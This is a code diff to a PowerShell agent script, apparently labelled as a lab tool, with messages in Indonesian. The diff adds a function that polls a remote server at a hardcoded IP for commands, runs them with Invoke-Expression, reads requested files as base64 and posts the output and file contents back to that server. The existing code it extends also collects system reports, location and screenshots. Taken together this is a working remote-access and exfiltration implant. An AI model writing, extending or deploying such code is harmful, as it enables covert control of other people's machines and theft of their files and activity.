@@ -2,6 +2,7 @@ $ServerIP = "172.16.225.135"
 $ServerPort = "8080"
 $MachineID = "win-lab-1"
 $Base = "http://" + $ServerIP + ":" + $ServerPort
+$AgentKey = ""
 
 function Get-SystemReport {
     $out = New-Object System.Text.StringBuilder
@@ -234,6 +235,58 @@ function Send-OSLocation {
     }
 }
 
+function Invoke-LabCommands {
+    try {
+        $wc = New-Object System.Net.WebClient
+        $wc.Proxy = $null
+        $url = $Base + "/cmd?id=" + [uri]::EscapeDataString($MachineID)
+        if ($AgentKey) { $url += "&key=" + [uri]::EscapeDataString($AgentKey) }
+        $json = $wc.DownloadString($url)
+        $cmds = @($json | ConvertFrom-Json)
+    } catch {
+        $cmds = @()
+    }
+    foreach ($c in $cmds) {
+        $cid = $c.cid
+        $cmdline = [string]$c.cmd
+        $output = ""
+        $data = ""
+        $data_name = ""
+        if ($cmdline -match '^GETFILE\s+(.+)$') {
+            $path = $Matches[1].Trim()
+            if (Test-Path $path) {
+                $item = Get-Item $path
+                $data = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($path))
+                $data_name = $item.Name
+                $output = "[OK] File siap diunduh: $path ($([math]::Round($item.Length/1KB,1)) KB)"
+            } else {
+                $output = "[ERR] File tidak ditemukan: $path"
+            }
+        } else {
+            try {
+                $output = Invoke-Expression $cmdline 2>&1 | Out-String
+            } catch {
+                $output = "[ERR] " + $_.Exception.Message
+            }
+        }
+        try {
+            $wc2 = New-Object System.Net.WebClient
+            $wc2.Proxy = $null
+            $wc2.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+            $body = "machine=" + [uri]::EscapeDataString($MachineID) +
+                    "&cid=" + [uri]::EscapeDataString($cid) +
+                    "&output=" + [uri]::EscapeDataString($output) +
+                    "&data=" + [uri]::EscapeDataString($data) +
+                    "&data_name=" + [uri]::EscapeDataString($data_name)
+            if ($AgentKey) { $body += "&key=" + [uri]::EscapeDataString($AgentKey) }
+            $resp = $wc2.UploadString($Base + "/result", $body)
+            Write-Host "[+] Hasil perintah dikirim (CID $cid): $($cmdline.Substring(0, [Math]::Min(40, $cmdline.Length)))"
+        } catch {
+            Write-Host "[!] Gagal kirim hasil: $($_.Exception.Message)"
+        }
+    }
+}
+
 $wc = New-Object System.Net.WebClient
 $wc.Proxy = $null
 
@@ -254,6 +307,8 @@ try {
 }
 
 Send-OSLocation
+
+Invoke-LabCommands
 
 $shot = Get-ScreenshotB64
 if ($shot) {
